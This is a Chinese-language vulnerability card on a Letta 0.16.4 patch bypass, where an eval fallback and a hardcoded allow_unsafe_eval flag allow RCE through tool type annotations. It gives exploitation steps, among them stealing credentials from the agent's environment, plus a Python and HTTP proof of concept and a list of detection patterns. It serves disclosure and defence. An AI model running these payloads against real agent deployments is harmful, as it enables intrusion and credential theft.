---
id: ai-security-agent-security-letta-ast-whitelist-eval-fallback-bypass
title: Letta AST 白名单异常回退 eval 与 allow_unsafe_eval 硬编码导致补丁绕过 RCE
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: ast-whitelist-eval-fallback-bypass
aliases:
- Letta 补丁绕过
- allow_unsafe_eval
- AST 白名单绕过
- CVE-2025-6101 bypass
- resolve_type eval
tags:
- ai-agent
- letta
- rce
- ast
- eval
- sandbox-escape
- patch-bypass
- cve-2025-6101
cve:
- CVE-2025-6101
severity: high
confidence: medium
affected_versions: letta 0.16.4（官方声称已修复版本；底层沙箱仍硬编码 allow_unsafe_eval=True）
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-F
  verified_at: '2026-11-04T19:21:10+08:00'
  notes: 全文与 10 张图片逐张核对。0.16.4 ast_parsers.resolve_type 以 vars(typing)+vars(builtins) 构造命名空间，ast.parse 失败进入 except Exception，allow_unsafe_eval 为真时 eval(annotation, python_types)（图 08），与卡片一致；findstr 确认 tool_execution_sandbox.py:546、tool_manager.py:177、tool_sandbox/base.py:274 硬编码 allow_unsafe_eval=True（图 09）。文章仅直接调用 resolve_type(..., allow_unsafe_eval=True) 弹出计算器（图 10），未展示 /v1/tools/run 的完整 HTTP 请求/响应，卡片已在 PoC 与限制中明确标注为概念性入口并定 confidence medium，未将直接调用写成端到端验证。affected_versions=letta 0.16.4（官方声称已修复版本；底层仍硬编码）与原文一致；路径、frontmatter 合法，无 sources/source/URL 字段。PoC 未在本机执行。
---

## 一句话结论

Letta 0.16.4 用 AST 白名单替换了旧的 eval 注入，但 `resolve_type` 在解析异常时仍会回退到 `eval(annotation, python_types)`；而 `tool_execution_sandbox.py`、`tool_manager.py`、`tool_sandbox/base.py` 等沙箱调度链路硬编码 `allow_unsafe_eval=True`，导致攻击者提交带恶意类型注解的工具源码即可绕过白名单，在“已修复”版本上继续 RCE。

## 原理

- `ast_parsers.resolve_type` 先用 `python_types = {**vars(typing), **vars(builtins)}` 构造命名空间，因此 `__import__`、`eval`、`exec`、`open` 等 builtins 全部暴露。
- 正常路径：`ast.parse(annotation, mode="eval")` 后交给 `_resolve_annotation_node`；该函数采用白名单，遇到 `ast.Call` 等危险节点会抛异常。
- 异常路径：`except Exception:` 分支检查 `allow_unsafe_eval`，为真时直接 `return eval(annotation, python_types)`。白名单的“拒绝”被转换成了“回退执行”，防御逻辑反而成为触发路径。
- 关键放大器：底层沙箱不是默认关闭，而是在核心调度代码里硬编码 `allow_unsafe_eval=True`（`tool_execution_sandbox.py:546`、`tool_manager.py:177`、`tool_sandbox/base.py:274`）。应用层即便把默认参数设为 False，底层调用仍把它打开。
- 攻击链：未认证 `POST /v1/tools/run` 提交工具源码 → 工具初始化调用 `resolve_type` 解析类型注解 → 白名单对 `ast.Call` 抛异常 → `except` 因硬编码 True 走 `eval` → 任意 Python 执行。
- 这是“补丁只改了上层入口、没有收回底层危险回退”的典型：跨文件信任链断裂，单点白名单无法覆盖调用链上的硬编码赋值。

## 触发条件

- Letta 0.16.4 或仍保留“AST 异常回退 eval + 底层 allow_unsafe_eval=True”组合的版本。
- 攻击者可访问 `/v1/tools/run`（文章称无需认证）或能触发工具注册/初始化路径。
- 可提交工具源码并控制其中的类型注解（字符串注解或可被 `resolve_type` 解析的注解）。
- 沙箱调度链路使用硬编码 `allow_unsafe_eval=True`；`python_types` 暴露 builtins。

## 利用步骤

1. 确认目标为 Letta 0.16.4（或检索目标源码中 `allow_unsafe_eval=True` 是否存在于 tool sandbox/tool manager/base）。
2. 构造工具源码，在类型注解中放入恶意表达式，例如 `def f(x: "__import__('os').popen('id').read()"): ...`。
3. 向 `/v1/tools/run` 提交该工具；服务端初始化工具时调用 `resolve_type`。
4. AST 白名单遇到 `ast.Call` 抛异常，`except Exception` 因 `allow_unsafe_eval=True` 执行 `eval(annotation, python_types)`。
5. 命令在 Agent/沙箱进程内执行；读取环境变量中的模型与云凭据、Agent 记忆/系统提示词，或向内部服务横向。
6. 若目标是完整容器，再结合沙箱配置缺陷尝试逃逸到宿主机。

## PoC

直接验证 eval 回退（文章实测可弹出计算器）：

```python
from letta.functions.ast_parsers import resolve_type

malicious_annotation = "__import__('os').popen('calc').read()"
resolve_type(malicious_annotation, allow_unsafe_eval=True)
```

概念性 HTTP 入口（实际字段以目标版本 API 为准）：

```http
POST /v1/tools/run HTTP/1.1
Content-Type: application/json

{"source_code": "def f(x: \"__import__('os').popen('id').read()\"):\n    return x"}
```

```text
# 触发顺序
resolve_type(annotation)
  -> ast.parse -> _resolve_annotation_node -> ast.Call 抛异常
  -> except Exception -> allow_unsafe_eval=True -> eval(annotation, python_types)
```

## 变体与关联

- 变体：`vars(builtins)` 还暴露 `exec`、`open`、`compile` 等；可改用 `__import__('subprocess')`、`eval(compile(...))`；任何能触发解析异常的注解形态都能进入回退分支。
- 变体：硬编码 True 出现在多个文件（`tool_execution_sandbox.py`、`tool_manager.py`、`tool_sandbox/base.py`），只修一处仍会被其它调用链打开。
- 关联：[[ai-security-agent-security-letta-running-message-eval-rce]]（0.4.1 原始 Running 消息 eval 注入，同一 CVE 的前一形态）。
- 限制：文章用直接调用 `resolve_type(..., allow_unsafe_eval=True)` 验证回退执行，未展示 `/v1/tools/run` 的完整 HTTP 请求/响应；端到端入口依赖目标版本的 API 与工具初始化路径，故 confidence 定为 medium。

## 检测与防御

- 修复：删除 `except` 中的 `eval` 回退，解析失败必须抛 `ValueError` 并阻断工具注册（默认拒绝）；移除 `python_types` 中的 `vars(builtins)`，改用显式安全白名单。
- 修复：全局检索并删除 `allow_unsafe_eval=True`，尤其是 `tool_execution_sandbox.py`、`tool_manager.py`、`tool_sandbox/base.py`；把配置默认值改为 False 并验证所有调用链。
- 审计：SAST 规则检查 `ast.parse` 之后的 `eval` 回退、`allow_unsafe_eval` 赋值；不要只检查函数签名默认值，要追踪跨文件调用点的实际传参。
- 隔离：Agent 工具执行放入 gVisor/Firecracker 等强隔离沙箱；非 root、只读文件系统、限制出网；凭据不放在 Agent 容器环境变量中。
- 检测：工具源码/类型注解中出现 `__import__`、`eval`、`exec`、`os.system`、`popen`；Agent 进程异常拉起 shell 或子进程；`resolve_type` 以 `allow_unsafe_eval=True` 被调用。
